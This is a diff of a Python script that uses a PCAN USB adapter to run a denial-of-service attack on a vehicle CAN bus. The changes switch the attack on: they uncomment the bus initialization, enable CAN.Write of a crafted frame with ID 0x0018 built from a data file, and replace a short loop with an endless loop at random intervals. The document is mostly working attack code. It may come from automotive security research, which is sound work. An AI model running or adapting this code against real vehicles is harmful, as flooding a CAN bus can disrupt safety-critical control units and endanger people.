@@ -19,7 +19,6 @@ files = []
 for (dirpath, dirnames, filenames) in walk(mypath):
     files.extend(filenames)
 
-time_offset = 0.01
 
 
 def DoS_Attack(id, data):
@@ -27,7 +26,7 @@ def DoS_Attack(id, data):
     Fuzzing_ID = int(id, 16)
 
     DoS_DATA = TPCANMsg()
-    DoS_DATA.ID = int(Fuzzing_ID)
+    DoS_DATA.ID = Fuzzing_ID
     DoS_DATA.LEN = len(data)
     DoS_DATA.MSGTYPE = PCAN_MESSAGE_STANDARD
     
@@ -41,29 +40,38 @@ def DoS_Attack(id, data):
         else:
             DoS_DATA.DATA[i] = int(data[i], 16)
         all_datas += str(DoS_DATA.DATA[i]) + "\t"
+        # all_datas += data[i]+ "\t"
 
-    print(all_datas)
-    # CAN.Write(CAN_BUS, Fuzzing_attack)
+    # print(all_datas)
+    CAN.Write(CAN_BUS, DoS_DATA)
     # time.sleep(time_offset)
 
 if __name__ == "__main__":
-#    CAN = PCANBasic()                           #CAN 생성자 
-#    CAN_BUS = PCAN_USBBUS2
-#    result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
-#    if result != PCAN_ERROR_OK:           
-#        print("oh No")
-#        CAN.GetErrorText(result)
-#        print(result)
+    CAN = PCANBasic()                           #CAN 생성자 
+    CAN_BUS = PCAN_USBBUS6
+    # time_offset = random.uniform(0.001, 0.5)
     
-    file_id = files[0][:-4]
+    result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
+    if result != PCAN_ERROR_OK:           
+        print("oh No")
+        CAN.GetErrorText(result)
+        print(result)
+    
+    # file_id = files[0][:-4]
+    file_id = "0018"
     print(file_id)
-    file1 = open("Filtered Datas\\" + files[0])
+    # file1 = open("Filtered Datas\\" + files[0])
+    file1 = open("Filtered Datas\\0018.txt")
     lines = file1.readlines()
     l = int(len(lines[0][:-1])/2)
     print(l)
     print(lines[0])
     ind = 0
-    while ind <= 3:
+    # while ind <= 500:
+    while True:
+        # time_offset = 0.5
+        time_offset = random.uniform(0.001, 0.5)
+        print(time_offset)
         datas = []
         for i in range(l):
             datas.append(lines[0][i*2:i*2+2])
